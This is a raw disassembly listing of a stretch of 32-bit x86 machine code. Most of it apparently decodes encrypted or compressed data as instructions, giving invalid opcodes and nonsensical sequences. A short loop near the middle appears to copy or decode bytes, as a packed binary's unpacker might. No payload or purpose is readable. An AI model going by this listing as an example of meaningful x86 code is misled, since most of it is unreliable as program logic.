  404fb5:	mov    dl,0x6c
  404fb7:	sar    DWORD PTR [eax],1
  404fb9:	dec    esp
  404fba:	push   esi
  404fbb:	in     al,0x44
  404fbd:	and    esi,DWORD PTR [eax+0x74]
  404fc0:	dec    edx
  404fc1:	rol    BYTE PTR [ecx],0x48
  404fc4:	cmp    BYTE PTR [eax+0x65],ah
  404fc7:	stos   DWORD PTR es:[edi],eax
  404fc8:	mov    WORD PTR [edx],ss
  404fca:	push   edi
  404fcb:	rol    DWORD PTR [edi+0x7c59db83],0x44
  404fd2:	jp     0x405013
  404fd4:	add    eax,0x6030365d
  404fd9:	mov    bl,0xa3
  404fdb:	aam    0x30
  404fdd:	push   edi
  404fde:	add    al,0x35
  404fe0:	dec    ebp
  404fe1:	pop    ds
  404fe2:	ficom  WORD PTR [ebx+0x7a]
  404fe5:	fucomip st,st(4)
  404fe7:	mov    dl,0x5d
  404fe9:	mov    DWORD PTR [ebp+0x75],esp
  404fec:	loop   0x405005
  404fee:	sti    
  404fef:	mov    edi,0xd71533e
  404ff4:	imul   esp,DWORD PTR ds:0x1fab985e,0x5817ebed
  404ffe:	mov    ah,0x23
  405000:	fisub  DWORD PTR [ebx+esi*4]
  405003:	xor    eax,0xa43f1daf
  405008:	retf   0x96d
  40500b:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  40500d:	jnp    0x405067
  40500f:	ror    cl,1
  405011:	shl    BYTE PTR [ebx-0x6f],1
  405014:	in     eax,0x57
  405016:	(bad)  [esi+0x69cf0ff6]
  40501c:	dec    ebx
  40501d:	(bad)  
  40501e:	les    edi,FWORD PTR [edx+ebp*8+0x25]
  405022:	xor    eax,0xf025865b
  405027:	cld    
  405028:	js     0x40505a
  40502a:	xchg   esp,eax
  40502c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40502d:	in     al,dx
  40502e:	test   BYTE PTR [ebx],dl
  405030:	add    esp,eax
  405032:	adc    dl,bh
  405034:	jnp    0x405098
  405036:	les    edi,FWORD PTR [esi-0x4008598d]
  40503c:	in     al,dx
  40503d:	dec    esi
  40503e:	sub    BYTE PTR [edi+0x78a4438c],dh
  405044:	call   0x239f122b
  405049:	in     al,0xc9
  40504b:	add    dl,BYTE PTR [ebp+0x2994a0d7]
  405051:	or     BYTE PTR [eax+0x5c2165d9],al
  405057:	jmp    0xb1b:0x2dbc9492
  40505e:	push   ss
  40505f:	mov    gs,WORD PTR [esp+esi*2+0x6a]
  405063:	mov    ds:0x129bdb98,eax
  405068:	imul   ecx,DWORD PTR [edx+0x62],0xffffff8e
  40506c:	and    ah,BYTE PTR [ebp-0x746364f6]
  405072:	xlat   BYTE PTR ds:[ebx]
  405073:	test   BYTE PTR [ebp-0x48],bh
  405076:	call   0x59ea:0x53ba7918
  40507d:	div    bh
  40507f:	repz and esp,DWORD PTR [eax]
  405082:	inc    ebp
  405083:	xor    ch,BYTE PTR [eax]
  405085:	sbb    al,0xe1
  405087:	rcl    DWORD PTR [edi-0xd],cl
  40508a:	not    al
  40508c:	scas   al,BYTE PTR es:[edi]
  40508d:	dec    edi
  40508e:	pusha  
  40508f:	shl    BYTE PTR [ebp+0x30],cl
  405092:	in     eax,0xbe
  405094:	out    0x7d,al
  405096:	ins    BYTE PTR es:[edi],dx
  405097:	or     al,BYTE PTR [ecx+0x3b4e8b13]
  40509d:	mov    al,0x6d
  40509f:	test   eax,0xde8e2143
  4050a4:	mov    bl,0xf9
  4050a6:	push   ecx
  4050a7:	mov    ch,0xa9
  4050a9:	pop    ebx
  4050aa:	pop    ss
  4050ab:	cmc    
  4050ac:	hlt    
  4050ad:	or     al,0xc0
  4050af:	mov    bl,0xcc
  4050b1:	mov    dh,0x21
  4050b3:	fsubrp st(4),st
  4050b5:	sub    al,0xaa
  4050b7:	mov    bh,0xf3
  4050b9:	leave  
  4050ba:	or     al,0x29
  4050bc:	and    ecx,esi
  4050be:	mov    ds:0x98f81b50,al
  4050c3:	xchg   esi,eax
  4050c4:	inc    ecx
  4050c5:	in     al,0x93
  4050c7:	mov    edi,0xffcd8d68
  4050cc:	sub    edi,eax
  4050ce:	add    edi,DWORD PTR [ebp+0x10]
  4050d1:	xor    edx,ecx
  4050d3:	add    edx,esi
  4050d5:	cmp    edx,edi
  4050d7:	ja     0x4059fd
  4050dd:	push   ebx
  4050de:	jmp    0x4053d8
  4050e3:	mov    esi,0x327298
  4050e8:	jmp    0x4053d8
  4050ed:	aas    
  4050ee:	rol    dh,1
  4050f0:	int3   
  4050f1:	aad    0xd2
  4050f3:	(bad)  
  4050f5:	dec    esp
  4050f6:	sub    BYTE PTR [ebx+0x1f9d32fe],bh
  4050fc:	lods   al,BYTE PTR ds:[esi]
  4050fd:	call   0x4db8c932
  405102:	jle    0x40517c
  405104:	js     0x405124
  405106:	mov    al,ds:0x9a83eb82
  40510b:	sti    
  40510c:	clc    
  40510d:	xor    al,0x7
  40510f:	dec    esi
  405110:	mov    bh,0xc3
  405112:	enter  0x1c0a,0x59
  405116:	aas    
  405117:	retf   
  405118:	std    
  405119:	in     al,dx
  40511a:	outs   dx,DWORD PTR ds:[esi]
  40511b:	into   
  40511c:	mov    ah,0x60
  40511e:	imul   edx,DWORD PTR [eax+0x4c3da57],0x7e
  405125:	dec    edi
  405126:	jno    0x4050f1
  405128:	les    esi,FWORD PTR [edx]
  40512a:	or     al,0x97
  40512c:	push   0xffffffd1
  40512e:	sub    dl,BYTE PTR [ebp+eiz*1-0x3]
  405132:	repz cli 
  405134:	inc    ecx
  405135:	push   ds
  405136:	xchg   edx,eax
  405137:	mov    ebp,0x11768247
  40513c:	push   esi
  40513d:	pop    edx
  40513e:	add    eax,0x3c90c725
  405143:	pop    eax
  405144:	and    BYTE PTR [esi+edi*4-0x427fd6d7],0xdb
  40514c:	pusha  
  40514d:	pop    eax
  40514e:	jmp    0x4050e3
  405150:	mov    ebx,0xbb801e5c
  405155:	sub    ch,ah
  405157:	xchg   esi,eax
  405158:	dec    esi
  405159:	cmp    dl,BYTE PTR [edi+0x69ecb9c7]
  40515f:	ins    BYTE PTR es:[edi],dx
  405160:	mov    ah,al
  405162:	rcl    DWORD PTR [esi-0x4545209],0x2a
  405169:	add    dl,bh
  40516b:	mov    bl,0x9
  40516d:	mov    eax,0xc2e0d76f
  405172:	push   0xffffff93
  405174:	inc    ebx
  405175:	stc    
  405176:	push   edx
  405177:	pusha  
  405178:	mov    ds:0xfcff9872,al
  40517d:	cmp    eax,0x8454c490
  405182:	mov    WORD PTR [eax-0x24],ss
  405185:	mov    al,0xcb
  405187:	inc    ecx
  405188:	mov    edx,0x521e2652
  40518d:	sub    esi,DWORD PTR [ebx-0x16]
  405190:	mov    edi,0x68d68ac4
  405195:	pop    ss
  405196:	mov    al,ds:0x7cef42c3
  40519b:	jno    0x4051b8
  40519d:	shl    DWORD PTR [ebx],cl
  40519f:	xor    al,0x66
  4051a1:	mov    DWORD PTR ds:0x18353ec7,ebp
  4051a7:	ss retf 0x463c
  4051ab:	int3   
  4051ac:	inc    ecx
  4051ad:	cli    
  4051ae:	mov    cl,cl
  4051b0:	fadd   st(4),st
  4051b2:	dec    esi
  4051b3:	mov    eax,0x7745b822
  4051b8:	bound  edi,QWORD PTR [edx]
  4051ba:	dec    edi
  4051bb:	mov    al,0x57
  4051bd:	and    al,BYTE PTR [ebx+0x40]
  4051c0:	add    esp,DWORD PTR [ecx+0x34]
  4051c3:	fcomp  DWORD PTR [ebp+0x23]
  4051c6:	int    0x8a
  4051c8:	and    BYTE PTR [eax],bl
  4051ca:	(bad)  
  4051cb:	std    
  4051cc:	in     eax,dx
  4051cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051ce:	xchg   ebx,eax
  4051cf:	pop    esp
  4051d0:	inc    esp
  4051d1:	mov    ds:0xdf3b6d1f,eax
  4051d6:	cmp    BYTE PTR [ecx+0x1f],cl
  4051d9:	fs retf 0x311b
  4051dd:	dec    ebp
  4051de:	out    0x95,eax
  4051e0:	in     al,dx
  4051e1:	bound  ebp,QWORD PTR [ecx+0x6b8af9ff]
  4051e7:	push   cs
  4051e8:	(bad)  
  4051ea:	sub    DWORD PTR [ebp+0x5b8e4527],ebp
  4051f0:	test   DWORD PTR [edx-0x6471c692],ebx
  4051f6:	stos   BYTE PTR es:[edi],al
  4051f7:	mov    al,0x1e
  4051f9:	mov    eax,ds:0xbc17d455
  4051fe:	(bad)  
  4051ff:	sti    
  405200:	test   DWORD PTR ds:0x6caac2d4,edx
  405206:	ss xchg edx,eax
  405208:	jl     0x405282
  40520a:	mov    ebx,0xb8405ea5
  40520f:	pop    esi
  405210:	nop
  405211:	mov    bl,0x9c
  405213:	jbe    0x405213
  405215:	or     al,0x3d
  405217:	sub    DWORD PTR [eax-0x5d2c5c8],edi
  40521d:	dec    edx
  40521e:	mov    ebx,0x37e48a7c
  405223:	add    al,0x0
  405225:	fwait
  405226:	les    ebp,FWORD PTR [edi+esi*1+0x7e]
  40522a:	sbb    al,0xfe
  40522c:	arpl   WORD PTR [edx+0x1e428126],bx
  405232:	xor    esp,DWORD PTR [edi+0x268cfe1a]
  405238:	xchg   edi,eax
  405239:	repz fisttp QWORD PTR [ebp+0x1d]
  40523d:	ins    DWORD PTR es:[edi],dx
  40523e:	jge    0x4051eb
  405240:	mov    ah,0xcf
  405242:	mov    bl,BYTE PTR [edi]
  405244:	int3   
  405245:	data16 fiadd DWORD PTR [ebx+0x294e4cf8]
  40524c:	aaa    
  40524d:	fdivr  st(0),st
  40524f:	and    al,0x2b
  405251:	cdq    
  405252:	ins    BYTE PTR es:[edi],dx
  405253:	inc    edx
  405254:	test   al,0x4c
  405256:	add    al,0x49
  405258:	sbb    eax,0x9680e83c
  40525d:	push   edi
  40525e:	mov    cl,0x9c
  405260:	aaa    
  405261:	lods   eax,DWORD PTR ds:[esi]
  405262:	daa    
  405263:	push   ebp
  405264:	std    
  405265:	lahf   
  405266:	dec    edx
  405267:	pop    eax
  405268:	dec    ebx
  405269:	mov    BYTE PTR [eax-0x52],dl
  40526c:	push   ss
  40526d:	scas   al,BYTE PTR es:[edi]
  40526e:	cmp    bh,BYTE PTR [edx]
  405270:	daa    
  405271:	and    eax,0x7d3f88b5
  405276:	jg     0x4052c3
  405278:	(bad)  [ebx+0x38]
  40527b:	xor    eax,0x37cd1113
  405280:	mov    ah,0x93
  405282:	cmp    eax,0x3893fcaa
  405287:	popa   
  405288:	das    
  405289:	inc    esp
  40528a:	popa   
  40528b:	repz cdq 
  40528d:	xchg   edi,eax
  40528e:	push   eax
  40528f:	add    eax,0x321067b
  405294:	fcomp  DWORD PTR [eax+0x2026533f]
  40529a:	lahf   
  40529b:	jle    0x405263
  40529d:	mov    DWORD PTR [edx+0x57],edx
  4052a0:	inc    ebx
  4052a1:	out    dx,al
  4052a2:	cdq    
  4052a3:	and    esi,ecx
  4052a5:	sbb    ecx,DWORD PTR [ebx-0x27ac29c6]
  4052ab:	or     al,0x63
  4052ad:	jg     0x4052fe
  4052af:	push   eax
  4052b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4052b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4052b2:	in     al,dx
  4052b3:	mov    eax,0xf84e8298
  4052b8:	cwde   
  4052b9:	adc    eax,0x729fad4d
  4052be:	adc    cl,BYTE PTR ds:0x9c976ae
  4052c4:	jno    0x4052dd
  4052c6:	cmp    bh,BYTE PTR [ecx+0x33]
  4052c9:	addr16 lahf 
  4052cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4052cc:	add    eax,0x9d39499e
  4052d1:	or     bh,BYTE PTR [ebx+0x5b0d92d8]
  4052d7:	inc    ecx
  4052d8:	push   ebp
  4052d9:	push   ebp
  4052da:	sahf   
  4052db:	and    eax,0x76507f98
  4052e0:	mov    bh,0x22
  4052e2:	mov    bl,0xf
  4052e4:	out    dx,al
  4052e5:	inc    esi
  4052e6:	cli    
  4052e7:	call   0xcab7:0x3313fe0
  4052ee:	frstor [esi+ecx*8+0x3f3a835b]
  4052f5:	cs sub DWORD PTR fs:[esp+ebx*8+0x1fb3412],eax
  4052fe:	sbb    eax,DWORD PTR [esi+ebx*8+0x2e]
  405302:	mov    ah,0xa8
  405304:	(bad)  
  405305:	and    ebp,edx
  405307:	fmul   DWORD PTR [eiz*4+0x33dd074c]
  40530e:	and    cl,bh
  405310:	neg    DWORD PTR ds:0x6dc206fa
  405316:	push   0xcc251e0e
  40531b:	bound  eax,QWORD PTR [edx]
  40531d:	and    BYTE PTR ds:0xe560124,dh
  405323:	add    eax,0x70cce365
  405328:	cmp    edi,DWORD PTR [ecx+0x6f]
  40532b:	aaa    
  40532c:	push   esi
  40532d:	imul   ebp,DWORD PTR [eax],0xf0c7fc5a
  405333:	sbb    bl,BYTE PTR [esi-0x1d]
  405336:	mov    ebx,0x9b6ec919
  40533b:	jmp    0x8ea1f6e4
  405340:	jecxz  0x40536d
  405342:	push   ds
  405343:	cmp    bl,ch
  405345:	push   ds
  405346:	aam    0xa6
  405348:	not    DWORD PTR [esi-0x7a43dbad]
  40534e:	cmp    esi,0x2d42eeb6
  405354:	cmp    al,0x9
  405356:	push   es
  405357:	rol    BYTE PTR [eax],1
  405359:	dec    esi
  40535a:	cmc    
  40535b:	fistp  WORD PTR [ebp-0x44]
  40535e:	cwde   
  40535f:	ja     0x405313
  405361:	push   ebp
  405362:	cmp    eax,0xbcdcb306
  405367:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405368:	and    cl,dh
  40536a:	(bad)  
  40536b:	mov    edx,0xa6ec0efe
  405370:	cld    
  405371:	in     eax,0x8e
  405373:	xor    bl,bh
  405375:	mov    dl,0x2c
  405377:	data16 xlat BYTE PTR ds:[ebx]
  405379:	dec    eax
  40537a:	fidiv  DWORD PTR [ecx]
  40537c:	out    dx,al
  40537d:	mov    al,0xc7
  40537f:	xor    al,0xa3
  405381:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405382:	pop    es
  405383:	xlat   BYTE PTR ds:[ebx]
  405384:	mov    ss,WORD PTR [ebx+ecx*4]
  405387:	into   
  405388:	adc    ebx,DWORD PTR [edx+0x3c9f2b7f]
  40538e:	or     DWORD PTR [edx],ebx
  405390:	and    DWORD PTR ds:0xb0f3f926,edx
  405396:	(bad)  
  405397:	fcmove st,st(5)
  405399:	xor    ebx,DWORD PTR [ecx-0x71]
  40539c:	rcl    BYTE PTR [ebp-0x1d],cl
  40539f:	mov    dl,0x47
  4053a1:	or     BYTE PTR [ecx-0x2edff969],0x10
  4053a8:	cmp    al,0xa3
  4053aa:	xchg   ebp,eax
  4053ab:	xchg   ecx,eax
  4053ac:	sub    ebx,ebp
  4053ae:	sbb    edx,eax
  4053b0:	aaa    
  4053b1:	shr    DWORD PTR [ebp+0x24],1
  4053b4:	sti    
  4053b5:	pop    edx
  4053b6:	mov    al,ds:0xb4a184ff
  4053bb:	leave  
  4053bc:	adc    ch,BYTE PTR [ecx]
  4053be:	fisubr WORD PTR [edx-0x4205b336]
  4053c4:	iret   
  4053c5:	lahf   
  4053c6:	and    ebp,DWORD PTR [edi+esi*1+0x2a]
  4053ca:	test   DWORD PTR [eax-0x33847a73],ebx
  4053d0:	add    eax,0x4836f1ca
  4053d5:	or     DWORD PTR [eax+ecx*4-0x75],edi
  4053d9:	inc    ebp
  4053da:	clc    
  4053db:	jmp    0x4056cb
  4053e0:	int    0xd3
  4053e2:	rol    ah,cl
  4053e4:	ror    cl,cl
  4053e6:	aad    0xd9
  4053e8:	inc    edx
  4053e9:	jecxz  0x40544a
  4053eb:	fsub   st(1),st
  4053ed:	push   eax
  4053ee:	fucomp st(6)
  4053f0:	cmp    eax,0x4d787835
  4053f5:	jle    0x40546f
  4053f7:	js     0x40541c
  4053f9:	adc    al,0x34
  4053fb:	sub    DWORD PTR [esi],ecx
  4053fd:	in     al,dx
  4053fe:	sub    eax,0x471283e2
  405403:	scas   eax,DWORD PTR es:[edi]
  405404:	push   esp
  405405:	scas   eax,DWORD PTR es:[edi]
  405406:	add    DWORD PTR [edx+0xe97c4c8],esi
  40540c:	cmp    BYTE PTR [ebx+0x69],0x27
  405410:	in     al,0xb3
  405412:	mov    BYTE PTR [ebx-0x51],cl
  405415:	movd   DWORD PTR [ecx+eiz*1+0x6ccb4e76],mm0
  40541d:	xchg   ebp,eax
  40541e:	mov    bl,0x5b
  405420:	sbb    eax,esi
  405422:	xor    dl,BYTE PTR [ecx-0x51b3b6cf]
  405428:	retf   0x1a43
  40542b:	sbb    esp,DWORD PTR [eax+ecx*2+0x7e]
  40542f:	fisttp WORD PTR [ebp-0x435ff430]
  405435:	pop    ebx
  405436:	add    BYTE PTR [eax],bl
  405438:	mov    al,0xef
  40543a:	pushf  
  40543b:	stos   DWORD PTR es:[edi],eax
  40543c:	jg     0x405459
  40543e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40543f:	xchg   ebp,eax
  405440:	jl     0x40543e
  405442:	or     eax,0xc16ad2b6
  405447:	shr    BYTE PTR [ebp+0x47],0xcd
  40544b:	dec    ecx
  40544c:	xchg   ebx,eax
  40544d:	xchg   ecx,eax
  40544e:	dec    ebx
  40544f:	xchg   ecx,eax
  405450:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  405452:	in     al,dx
  405453:	mov    esi,0x6aab4cd4
  405458:	push   ebx
  40545a:	sub    ebp,DWORD PTR [edx-0x10]
  40545d:	out    dx,eax
  40545e:	sbb    bh,dh
  405460:	loop   0x405495
  405462:	call   0x1756:0x1a68468d
  405469:	lods   al,BYTE PTR ds:[esi]
  40546a:	mov    esi,0xf1e8742e
  40546f:	stos   DWORD PTR es:[edi],eax
  405470:	mov    dl,0x1f
  405472:	lock js 0x4053f8
  405475:	sbb    al,0x90
  405477:	fild   QWORD PTR [ebx+0x2dd85722]
  40547d:	sbb    ebp,esi
  40547f:	lock xor eax,0xd709abe
  405485:	dec    ebx
  405486:	jecxz  0x4054de
  405488:	loope  0x4054cc
  40548a:	in     al,0x71
  40548c:	cmp    al,0xfd
  40548e:	cld    
  40548f:	cli    
  405490:	dec    esi
  405491:	mov    bh,BYTE PTR [eax-0x76c79069]
  405497:	jnp    0x4054aa
  405499:	dec    esp
  40549a:	ins    BYTE PTR es:[edi],dx
  40549b:	stos   BYTE PTR es:[edi],al
  40549c:	jne    0x405508
  40549e:	cmp    BYTE PTR [ecx+0x35],0x1c
  4054a2:	ret    0x64b9
  4054a5:	mov    bl,0xb7
  4054a7:	fwait
  4054a8:	sbb    al,BYTE PTR [esi]
  4054aa:	cli    
  4054ab:	out    dx,eax
  4054ac:	dec    esi
  4054ad:	add    al,0xf5
  4054af:	(bad)  
  4054b1:	bnd jmp 0x9acbd694
  4054b7:	or     BYTE PTR ds:0x35fc75d3,0xca
  4054be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4054bf:	adc    eax,DWORD PTR [eax+0x44]
  4054c2:	lahf   
  4054c3:	out    0xf7,al
  4054c5:	or     BYTE PTR [esi-0x3813db72],ch
  4054cb:	cmp    cl,ch
  4054cd:	mov    al,ds:0xa8f2fbc
  4054d2:	scas   al,BYTE PTR es:[edi]
  4054d3:	jmp    0x40546c
  4054d5:	jg     0x4054a0
  4054d7:	cmp    ecx,ebx
  4054d9:	stos   BYTE PTR es:[edi],al
  4054da:	outs   dx,DWORD PTR ds:[esi]
  4054db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4054dc:	adc    DWORD PTR [ecx-0x5c53048d],ebp
  4054e2:	mov    esi,0x75c468ea
  4054e7:	lea    esi,[eax+0x1e]
  4054ea:	xchg   esi,eax
  4054eb:	and    al,0x3c
  4054ed:	adc    eax,0x8789b879
  4054f2:	les    ecx,FWORD PTR cs:[edx+edi*4+0x1c]
  4054f7:	add    BYTE PTR [ecx],dh
  4054f9:	rol    BYTE PTR [ecx+0x6b529e9e],1
  4054ff:	xor    eax,0x5ee534fb
  405504:	fmul   DWORD PTR [edx-0x693f8698]
  40550a:	leave  
  40550b:	mov    bl,0x1e
  40550d:	lgs    ebx,FWORD PTR [edx+0x2624ad74]
  405514:	es jae 0x4054ed
  405517:	sub    eax,0x2a0abb15
  40551c:	adc    eax,0xf94967f2
  405521:	out    dx,eax
  405522:	cmp    eax,DWORD PTR [ecx+0x4484a667]
  405528:	call   0xb2f3:0x2b4dba02
  40552f:	call   0xd299589a
  405534:	aam    0x13
  405536:	xor    DWORD PTR [eax],edi
  405538:	xor    esi,DWORD PTR [ebx-0x65]
  40553b:	pop    ss
  40553c:	pop    ss
  40553d:	mov    ch,0xee
  40553f:	sbb    eax,0xaef6dc82
  405544:	xchg   ecx,eax
  405545:	sbb    al,0xe0
  405547:	std    
  405548:	test   eax,0xb3d6a442
  40554d:	inc    eax
  40554e:	mov    esi,0xb45f04c0
  405553:	xor    BYTE PTR [ecx+0x73],bh
  405556:	dec    esp
  405557:	lahf   
  405558:	int3   
  405559:	xor    edx,eax
  40555b:	retw   
  40555d:	iret   
  40555e:	and    eax,0x67ba584b
  405563:	imul   ebp,DWORD PTR [esi+0x51],0xffffffab
  405567:	mov    dl,0xac
  405569:	js     0x405502
  40556b:	cwde   
  40556c:	aam    0x9d
  40556e:	out    0x4f,eax
  405570:	adc    BYTE PTR [ebx+0x2a],dh
  405573:	pop    ecx
  405574:	adc    al,ch
  405576:	push   edx
  405577:	lods   eax,DWORD PTR ds:[esi]
  405578:	cmp    al,BYTE PTR [ebx-0x42c361d8]
  40557e:	jge    0x405565
  405580:	xchg   esp,eax
  405581:	dec    edx
  405582:	inc    edx
  405583:	fisubr DWORD PTR [edi]
  405585:	pushf  
  405586:	mov    al,0x6d
  405588:	mov    al,0x81
  40558a:	std    
  40558b:	sbb    al,0xe5
  40558d:	sub    edi,edi
  40558f:	ds leave 
  405591:	fs int3 
  405593:	jbe    0x4055fb
  405595:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405596:	xlat   BYTE PTR ds:[ebx]
  405597:	inc    esi
  405598:	enter  0x52c,0xd7
  40559c:	pop    eax
  40559d:	aaa    
  40559e:	lods   al,BYTE PTR ds:[esi]
  40559f:	xchg   ebx,eax
  4055a0:	jo     0x405609
  4055a2:	add    ebx,DWORD PTR [edx]
  4055a4:	dec    ebp
  4055a5:	ins    DWORD PTR es:[edi],dx
  4055a6:	sub    BYTE PTR [edi-0x8],dl
  4055a9:	push   es
  4055aa:	lock jae 0x405609
  4055ad:	hlt    
  4055ae:	daa    
  4055af:	test   DWORD PTR [edi+0x491b75cd],ebp
  4055b5:	int    0xab
  4055b7:	adc    DWORD PTR [edi+0x2fe1c8d6],esi
  4055bd:	pop    esp
  4055be:	add    al,0x7b
  4055c0:	jmp    0xaf5811e7
  4055c5:	push   ebx
  4055c6:	retf   0xbcc8
  4055c9:	in     al,0xa4
  4055cb:	out    dx,al
  4055cc:	jp     0x4055a6
  4055ce:	pop    eax
  4055cf:	repz lahf 
  4055d1:	repnz push ecx
  4055d3:	mov    BYTE PTR [edi],0xa9
  4055d6:	retf   
  4055d7:	sbb    bh,BYTE PTR [ebx-0x40]
  4055da:	xchg   edx,eax
  4055db:	aad    0x37
  4055dd:	cmp    eax,eax
  4055df:	jg     0x405623
  4055e1:	scas   eax,DWORD PTR es:[edi]
  4055e2:	call   0xe36c76a0
  4055e7:	mov    ch,0x15
  4055e9:	add    BYTE PTR [ecx],0x7c
  4055ec:	push   cs
  4055ed:	test   al,0x40
  4055ef:	mov    esi,edi
  4055f1:	ret    0x50df
  4055f4:	out    dx,eax
  4055f5:	je     0x40559c
  4055f7:	aad    0x75
  4055f9:	dec    ecx
  4055fa:	add    ch,dl
  4055fc:	sbb    al,0xa9
  4055fe:	addr16 push edi
  405600:	jne    0x4055df
  405602:	aad    0x99
  405604:	and    ah,BYTE PTR [esi-0xa9f5690]
  40560a:	pop    ss
  40560b:	cmp    eax,0xfa844b49
  405610:	stos   BYTE PTR es:[edi],al
  405611:	loopne 0x4055dd
  405613:	pop    es
  405614:	outs   dx,BYTE PTR ds:[esi]
  405615:	sub    DWORD PTR [edx-0x2f],0x6a5436e2
  40561c:	shl    DWORD PTR [ebx+0x23],0x86
  405620:	gs mov cl,dl
  405623:	fwait
  405624:	cdq    
  405625:	adc    DWORD PTR [ebp+ecx*4+0x6bc0b102],edx
  40562c:	retf   0xd195
  40562f:	data16 ja 0x4055dc
  405632:	mov    eax,0x763118a0
  405637:	xor    eax,0xf70d03b8
  40563c:	js     0x4055dd
  40563e:	daa    
  40563f:	mov    al,ds:0xfdf708b3
  405644:	call   0xd347:0xe761c336
  40564b:	in     al,0x80
  40564d:	into   
  40564e:	dec    ebp
  40564f:	arpl   WORD PTR es:[esi+0x565f613b],bp
  405656:	mov    ?,WORD PTR [edi]
  405658:	jnp    0x4056d1
  40565a:	fwait
  40565b:	hlt    
  40565c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40565d:	fld    QWORD PTR [ecx+0x5d]
  405660:	jle    0x405664
  405662:	shr    DWORD PTR ds:0xdb0e9a62,1
  405668:	and    DWORD PTR [esi+0x3c],edi
  40566b:	cli    
  40566c:	mov    al,ds:0x336596ec
  405671:	cmp    BYTE PTR [eax+0x6ad1ab74],al
  405677:	fmulp  st(5),st
  405679:	(bad)  
  40567a:	sub    BYTE PTR [ebx-0x3e],ch
  40567d:	jae    0x405604
  40567f:	scas   eax,DWORD PTR es:[edi]
  405680:	jecxz  0x4056a5
  405682:	in     al,0xf7
  405684:	cmp    ebx,DWORD PTR [esi+0x3d05b8b6]
  40568a:	sub    edi,eax
  40568c:	(bad)  
  40568d:	push   cs
  40568e:	inc    ecx
  40568f:	(bad)  
  405690:	or     al,0x45
  405692:	ins    DWORD PTR es:[edi],dx
  405693:	les    ebx,FWORD PTR [ecx-0x80]
  405696:	jo     0x40564e
  405698:	mov    ds:0x4e7f1112,eax
  40569d:	gs push 0xffffffc7
  4056a0:	mov    esi,0xb580531a
  4056a5:	shr    bl,1
  4056a7:	or     al,0x5a
  4056a9:	dec    esi
  4056aa:	xchg   ebp,eax
  4056ab:	jle    0x4056dc
  4056ad:	dec    ecx
  4056ae:	add    ebp,DWORD PTR [esi]
  4056b0:	fsubr  DWORD PTR [edx*1-0x7f73b0a8]
  4056b7:	out    0xc6,al
  4056b9:	or     BYTE PTR [edi+0x66],al
  4056bc:	aas    
  4056bd:	dec    ebx
  4056be:	(bad)  
  4056bf:	aaa    
  4056c0:	xchg   ebx,eax
  4056c1:	loopne 0x4056ba
  4056c3:	jno    0x4056ec
  4056c5:	sub    eax,0x62105f29
  4056ca:	xchg   esi,eax
  4056cb:	mov    edi,DWORD PTR [ebp-0x4]
  4056ce:	xor    edi,ecx
  4056d0:	add    edi,esi
  4056d2:	mov    esi,DWORD PTR [ebp+0x8]
  4056d5:	imul   edi,edx
  4056d8:	mov    ebx,DWORD PTR [ebp+0xc]
  4056db:	xor    eax,ecx
  4056dd:	add    eax,edx
  4056df:	mov    al,BYTE PTR [ebx+eax*1+0x327298]
  4056e6:	mov    BYTE PTR [edi+esi*1],al
  4056e9:	mov    eax,DWORD PTR [ebp-0x4]
  4056ec:	xor    eax,ecx
  4056ee:	lea    edx,[edx+eax*1+0x327298]
  4056f5:	mov    eax,DWORD PTR [ebp-0x4]
  4056f8:	xor    eax,ecx
  4056fa:	mov    esi,0xffcd8d68
  4056ff:	sub    esi,eax
  405701:	jmp    0x4059f1
  405706:	rol    esi,cl
  405708:	retf   0xd9c2
  40570b:	ret    0xd5db
  40570e:	shr    DWORD PTR [edx],0xd2
  405711:	ins    BYTE PTR es:[edi],dx
  405712:	mov    ah,0x27
  405714:	pop    ebp
  405715:	mov    eax,0x78783a12
  40571a:	dec    ebp
  40571b:	jle    0x405795
  40571d:	js     0x40571a
  40571f:	add    al,0xe1
  405722:	pop    ebx
  405723:	jmp    0xc3f03e7b
  405728:	and    dh,BYTE PTR [esi-0x15]
  40572b:	adc    bl,dh
  40572d:	ins    BYTE PTR es:[edi],dx
  40572e:	lahf   
  40572f:	jmp    0x2b41:0xe3ad492a
  405736:	and    DWORD PTR [edx],ebx
  405738:	lods   eax,DWORD PTR ds:[esi]
  405739:	subps  xmm3,XMMWORD PTR [edx]
  40573c:	mov    ds:0x9efc1d93,eax
  405741:	push   ss
  405742:	adc    ecx,DWORD PTR [edi]
  405744:	sub    eax,0x9045c9b4
  405749:	push   eax
  40574a:	sub    BYTE PTR [edx+edi*1],dl
  40574d:	lock dec edi
  40574f:	enter  0xf772,0xeb
  405753:	xchg   dh,ah
  405755:	mov    ds:0xdb09a04a,al
  40575a:	(bad)  
  40575b:	and    bl,BYTE PTR [esp+ecx*8+0x55]
  40575f:	adc    al,0x53
  405761:	(bad)  
  405762:	mov    edx,0xfb98d4d7
  405767:	sub    eax,0xdfd161e2
  40576c:	adc    dl,dl
  40576e:	fnstenv [esi+0x370407ce]
  405774:	aas    
  405775:	mov    eax,0x51e11ace
  40577a:	psllw  mm2,0x77
  40577e:	dec    edi
  40577f:	pop    es
  405780:	jbe    0x405732
  405782:	jmp    0x405790
  405784:	in     al,dx
  405785:	popa   
  405786:	jg     0x40571f
  405788:	stos   DWORD PTR es:[edi],eax
  405789:	cmc    
  40578a:	mov    ds:0xd5ba655e,eax
  405790:	retf   0xda90
  405793:	sti    
  405794:	push   ebp
  405795:	int    0x7b
  405797:	push   ebx
  405798:	in     eax,0xd1
  40579a:	sbb    al,0x3f
  40579c:	jge    0x40576d
  40579e:	mov    al,ds:0x45ae3131
  4057a3:	inc    edi
  4057a4:	pop    eax
  4057a6:	lea    esp,[ecx+0x5b21af25]
  4057ac:	in     al,dx
  4057ad:	nop
